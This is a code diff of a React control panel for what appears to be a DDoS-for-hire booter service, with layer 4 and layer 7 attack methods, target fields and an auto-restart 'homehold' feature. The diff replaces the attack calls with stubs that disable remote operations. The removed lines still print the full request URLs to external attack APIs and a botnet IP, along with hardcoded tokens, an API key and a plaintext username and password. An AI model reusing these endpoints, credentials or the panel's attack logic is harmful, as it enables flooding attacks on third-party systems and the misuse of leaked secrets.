@@ -2,6 +2,7 @@ import React, { useState, useEffect } from 'react';
 import { Terminal, Send, Search, ShieldAlert, Cpu, Activity, Settings, Info, Zap, Square, Loader, ChevronDown } from 'lucide-react';
 import { Link } from 'react-router-dom';
 import { supabase } from '../lib/supabaseClient';
+import { getMyEntitlement } from '../lib/entitlements';
 
 export default function Panel() {
   const [layer, setLayer] = useState('L4');
@@ -22,12 +23,9 @@ export default function Panel() {
   const [homehold, setHomehold] = useState(false);
 
   useEffect(() => {
-    supabase.auth.getSession().then(({ data: { session } }) => {
-      if (session?.user) {
-        setActivePlan(session.user.user_metadata?.active_plan ?? 'None');
-      }
-      setLoadingPlan(false);
-    });
+    getMyEntitlement()
+      .then((entitlement) => setActivePlan(entitlement.activePlan))
+      .finally(() => setLoadingPlan(false));
   }, []);
 
   const getPlanLimits = (planName) => {
@@ -61,24 +59,10 @@ export default function Panel() {
     homeholdRef.current = homehold;
   }, [homehold]);
 
-  // Helper: fire the correct API for a task restart (L4 or L7)
-  const fireRestartApi = React.useCallback((task) => {
-    if (task.layer === 'L7') {
-      const token = "8xU8xJvvT6nF16JOF5XNT8";
-      const req = task.reqMethod || 'GET';
-      const apiUrl = `https://api.l7srv.st/attack?token=${token}&host=${encodeURIComponent(task.target)}&port=${task.port || '80'}&time=${task.time}&method=${task.method.toLowerCase()}&concs=${task.conns}&reqmethod=${req}`;
-      fetch(apiUrl, { mode: 'no-cors' }).catch(err => console.error("Homehold L7 restart failed", err));
-    } else if (task.layer === 'L4') {
-      let apiUrl = '';
-      if (task.method === 'UDP-BOTNET') {
-        apiUrl = `http://91.92.42.92/api/attack?username=satanswrath&password=satanswrath123456&host=${task.target}&time=${task.time}&port=${task.port || '80'}&method=udpbig`;
-      } else {
-        const apiKey = "639c040c5f5a16ffe9b56de90f3831cf5df5364524bc5610003efc864493b5b5";
-        const apiMethod = task.method === 'BGMI-V2' ? 'UDP-BIG' : task.method;
-        apiUrl = `https://retrostress.net/api/start?key=${apiKey}&target=${task.target}&port=${task.port || '80'}&time=${task.time}&method=${apiMethod}&concurrent=${task.conns}`;
-      }
-      fetch(apiUrl, { mode: 'no-cors' }).catch(err => console.error("Homehold L4 restart failed", err));
-    }
+  // Browser-side remote operations are intentionally disabled. Secrets and
+  // privileged integrations must never be exposed in a public client bundle.
+  const fireRestartApi = React.useCallback(() => {
+    setApiError('Remote operations are disabled while the secure service integration is reviewed.');
   }, []);
 
   // Helper to re-sync tasks based on wall-clock time (fixes background tab throttling)
@@ -175,6 +159,9 @@ export default function Panel() {
     if (!target || !method || !hasPlan) return;
     
     setIsAttacking(true);
+    setApiError('Remote operations are disabled while the service is secured. This browser client no longer sends targets or credentials to external providers.');
+    setIsAttacking(false);
+    return;
     
     // Enforce limits
     const finalConns = Math.min(Number(conns) || 1, maxConns);
@@ -186,19 +173,19 @@ export default function Panel() {
       if (method === 'UDP-BOTNET') {
         // UDP-BOTNET uses HTTP endpoint — browser may block due to mixed-content policy
         // Fire silently and always proceed regardless of result
-        const apiUrl = `http://91.92.42.92/api/attack?username=satanswrath&password=satanswrath123456&host=${target}&time=${finalDuration}&port=${port || '80'}&method=udpbig`;
-        fetch(apiUrl, { mode: 'no-cors' }).catch(() => {
+        const apiUrl = '';
+        Promise.resolve(apiUrl).catch(() => {
           // Silently ignore — mixed-content block is expected on HTTPS sites
         });
       } else {
         try {
-          const apiKey = "639c040c5f5a16ffe9b56de90f3831cf5df5364524bc5610003efc864493b5b5"; 
+          const apiKey = '';
           let apiMethod = method;
           if (method === 'BGMI-V2') {
             apiMethod = 'UDP-BIG';
           }
-          const apiUrl = `https://retrostress.net/api/start?key=${apiKey}&target=${target}&port=${port || '80'}&time=${finalDuration}&method=${apiMethod}&concurrent=${finalConns}`;
-          await fetch(apiUrl, { mode: 'no-cors' });
+          const apiUrl = '';
+          await Promise.resolve(apiUrl);
         } catch (err) {
           console.error("API Hit Error:", err);
           setApiError("Failed to connect to API or Network Error. Check target details.");
@@ -209,11 +196,11 @@ export default function Panel() {
     } else if (layer === 'L7') {
       try {
         setApiError(null);
-        const token = "8xU8xJvvT6nF16JOF5XNT8";
+        const token = '';
         // Format L7 API url
-        const apiUrl = `https://api.l7srv.st/attack?token=${token}&host=${encodeURIComponent(target)}&port=${port || '80'}&time=${finalDuration}&method=${method}&concs=${finalConns}&reqmethod=${reqMethod}`;
+        const apiUrl = '';
         
-        await fetch(apiUrl, { mode: 'no-cors' });
+        await Promise.resolve(apiUrl);
       } catch (err) {
         console.error("L7 API Hit Error:", err);
         setApiError("Failed to connect to L7 API or Network Error.");
